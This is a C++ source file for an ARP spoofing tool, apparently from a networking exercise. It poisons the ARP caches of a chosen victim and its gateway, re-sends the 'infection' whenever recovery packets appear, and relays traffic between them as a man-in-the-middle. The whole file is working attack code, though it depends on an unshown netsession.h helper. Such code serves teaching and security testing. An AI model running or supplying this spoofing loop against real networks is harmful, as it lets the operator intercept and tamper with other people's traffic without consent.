// send_arp.c
#include <pcap.h>
#include <stdio.h>
#include "netsession.h"

using namespace std;

int main(int argc, char **argv){
	if(argc < 2){
		puts("Usage : sudo ./send_arp ip1.ip2.ip3.ip4");
		return 1;
	}

	try{
		Netssn::Session ses(256);
		string aip, amac;
		string vip=argv[1], vmac;
		string gip, gmac;
		int fcount=0;
		while(!Netssn::convert_ip2mac(vip, vmac)){
			fcount++;
			if(fcount >= 4)throw NetException("Given IP is not accessable.");
		}
		fcount=0;
		while(!Netssn::get_my_config(vip, aip, amac)){
			fcount++;
			if(fcount >= 4)throw NetException("Given IP is not accessable.");
		}
		if(!Netssn::get_gateway_IP(vip, gip))throw NetException("Gateway not Found");
		fcount=0;
		while(!Netssn::convert_ip2mac(gip, gmac)){
			fcount++;
			if(fcount >= 4)throw NetException("Given IP is not accessable.");
		}
		printf("Attacker : IP=%s, MAC=%s\n", aip.c_str(), amac.c_str());
		printf(" Victim  : IP=%s, MAC=%s\n", vip.c_str(), vmac.c_str());
		printf("Gateway  : IP=%s, MAC=%s\n", gip.c_str(), gmac.c_str());
		
		ses.set_config(aip, amac, gip, gmac, vip, vmac);

		ses.send_infection();
		puts("\n------ ARP Spoofing Start ------\n");
		while(1){
			Packet packet;
			ses.catch_packet(packet);
			
			if(ses.is_recover_packet(packet)){
				puts("ARP Recovery Detected");
				ses.send_infection();
			}
			if(int rtyp = ses.relay_packet(packet)){
				if(rtyp == 1)puts("IP - Victim Sent a Packet");
				if(rtyp == 2)puts("IP - Gateway Sent a Packet");
			}
	//		if(packet.pdu()->find_pdu<IP>())
	//			cout << "IP : " << packet.pdu()->rfind_pdu<IP>().src_addr() << endl;
		}
	}
	catch(exception &e){
		printf("Error: %s\n", e.what());
	}
	return 0;
}

